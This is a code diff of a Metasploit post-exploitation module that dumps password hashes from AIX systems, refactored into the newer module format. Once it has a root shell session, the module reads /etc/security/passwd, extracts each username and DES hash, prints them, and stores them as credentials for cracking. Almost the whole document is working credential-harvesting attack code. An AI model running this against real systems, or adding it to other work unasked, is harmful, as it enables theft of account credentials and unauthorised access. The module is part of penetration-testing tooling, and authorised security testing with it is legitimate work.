@@ -1,64 +1,64 @@
 ##
-# ## This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/post/common'
-require 'msf/core/post/file'
-require 'msf/core/post/linux/priv'
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+
+  def initialize(info={})
+    super( update_info( info,
+        'Name'          => 'AIX Gather Dump Password Hashes',
+        'Description'   => %q{ Post Module to dump the password hashes for all users on an AIX System},
+        'License'       => MSF_LICENSE,
+        'Author'        => ['theLightCosine'],
+        'Platform'      => [ 'aix' ],
+        'SessionTypes'  => [ 'shell' ]
+      ))
+
+  end
 
 
-class Metasploit3 < Msf::Post
+  def run
+    if is_root?
+      passwd_file = read_file("/etc/security/passwd")
 
-	include Msf::Post::Common
-	include Msf::Post::File
-	include Msf::Post::Linux::Priv
+      username = ''
+      hash     = ''
 
-	def initialize(info={})
-		super( update_info( info,
-				'Name'          => 'AIX Gather Dump Password Hashes',
-				'Description'   => %q{ Post Module to dump the password hashes for all users on an AIX System},
-				'License'       => MSF_LICENSE,
-				'Author'        => ['theLightCosine'],
-				'Platform'      => [ 'aix' ],
-				'SessionTypes'  => [ 'shell' ]
-			))
+      passwd_file.each_line do |line|
+        user_line = line.match(/(\w+):/)
+        if user_line
+          username = user_line[1]
+        end
 
-	end
+        hash_line = line.match(/password = (\w+)/)
+        if hash_line
+          hash = hash_line[1]
+        end
 
+        if hash.present?
+          print_good "#{username}:#{hash}"
+          credential_data = {
+              jtr_format: 'des',
+              origin_type: :session,
+              post_reference_name: self.refname,
+              private_type: :nonreplayable_hash,
+              private_data: hash,
+              session_id: session_db_id,
+              username: username,
+              workspace_id: myworkspace_id
+          }
+          create_credential(credential_data)
+          username = ''
+          hash     = ''
+        end
+      end
 
-	def run
-		if is_root?
-			passwd_file = read_file("/etc/security/passwd")
-			jtr = parse_aix_passwd(passwd_file)
-			store_loot("aix.hashes", "text/plain", session, jtr, "aix_passwd.txt", "AIX Password File")
-		else
-			print_error("You must run this module as root!")
-		end
+    else
+      print_error("You must run this module as root!")
+    end
 
-	end
-
-
-	def parse_aix_passwd(aix_file)
-		jtr_file = ""
-		tmp = ""
-		aix_file.each_line do |line|
-			username = line.match(/(\w+:)/)
-			if username
-				tmp = username[0]
-			end
-			hash = line.match(/password = (\w+)/)
-			if hash
-				tmp << hash[1]
-				jtr_file << "#{tmp}\n"
-			end
-		end
-		return jtr_file
-	end
-
-
+  end
 end
